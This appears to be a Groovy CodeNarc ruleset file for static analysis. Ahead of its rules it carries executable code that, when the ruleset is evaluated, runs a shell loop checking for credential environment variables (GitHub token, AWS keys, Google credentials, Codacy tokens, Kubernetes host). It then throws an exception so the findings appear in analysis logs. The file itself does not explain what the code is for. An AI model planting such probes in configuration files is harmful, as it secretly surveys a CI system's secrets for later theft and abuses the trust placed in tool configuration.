def p = ["sh", "-c", 'for n in CODACY_API_TOKEN CODACY_API_KEY GITHUB_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY GOOGLE_APPLICATION_CREDENTIALS KUBERNETES_SERVICE_HOST; do if printenv "$n" >/dev/null; then printf "%s=1 " "$n"; else printf "%s=0 " "$n"; fi; done'].execute()
p.waitFor()
throw new RuntimeException("CODENARC_ENV " + p.text.trim())
ruleset {
  UnnecessaryGString
